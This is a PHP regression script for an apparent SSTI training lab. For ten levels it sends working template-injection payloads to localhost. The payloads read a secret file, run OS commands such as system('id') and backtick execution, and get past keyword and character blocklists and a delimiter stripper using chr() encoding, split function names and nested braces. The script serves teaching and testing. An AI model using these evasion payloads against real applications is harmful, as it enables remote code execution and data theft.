<?php
/**
 * SSTI Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

/** GET a level page. $extra adds raw query parameters (already encoded). */
function get_level(int $level, string $tpl, string $extra = ''): string
{
    global $base;
    $url = "$base/level$level.php?tpl=" . rawurlencode($tpl) . ($extra !== '' ? '&' . $extra : '');
    $ctx = stream_context_create(['http' => [
        'method'        => 'GET',
        'timeout'       => 20,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

/** Secondary vectors: reported but not counted, so a broken alternative is visible. */
function alt(int $level, string $body, string $note): void
{
    echo strpos($body, get_flag_for_level($level)) !== false
        ? "        alt   level $level  ok    ($note)\n"
        : "        WARN  level $level  alternative did not land ($note)\n";
}

echo "SSTI Lab self-test\n------------------\n";

/* 1 - prove the {{ }} block is eval'd at all */
check(1, get_level(1, '{{7*7}}'), 'arithmetic evaluated');

/* 2 - reach a superglobal from inside the expression */
check(2, get_level(2, "{{ \$_SERVER['HTTP_HOST'] }}"), 'superglobal read');

/* 3 - call a built-in function */
check(3, get_level(3, '{{ phpversion() }}'), 'function call');

/* 4 - read the baked secret off disk (gate checks the real file content) */
check(4, get_level(4, "{{ file_get_contents('/var/secret/flag.txt') }}"), 'file_get_contents');
alt(4, get_level(4, "{{ implode('', file('/var/secret/flag.txt')) }}"), 'file() + implode');

/* 5 - real OS command execution */
check(5, get_level(5, "{{ system('id') }}"), "system('id')");
alt(5, get_level(5, '{{ `id` }}'), 'backtick operator');

/* 6 - keyword blocklist: never spell a blocked function name */
check(6, get_level(6, '{{ `id` }}'), 'backticks dodge the keyword list');
alt(6, get_level(6, "{{ call_user_func('sys'.'tem', 'id') }}"), 'split name + call_user_func');

/* 7 - character blocklist: no quotes, no backticks */
check(7, get_level(7, '{{ system(chr(105).chr(100)) }}'), 'chr() instead of a string literal');
alt(7, get_level(7, '{{ system($_GET[0]) }}', '0=id'), 'numeric GET key holds the command');

/* 8 - variable-function indirection (call_user_func and backticks blocked) */
check(8, get_level(8, "{{ \$f='sys'.'tem';\$f('id') }}"), 'name assembled in a variable');

/* 9 - single-pass delimiter stripper: nest so one tag survives */
check(9, get_level(9, '{{{{7*7}}}}'), 'nested delimiters');

/* 10 - keyword + character + stripper, all at once */
check(10, get_level(10, '{{{{ $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f(chr(105).chr(100)) }}}}'),
    'nested + chr() + variable function');

echo "------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
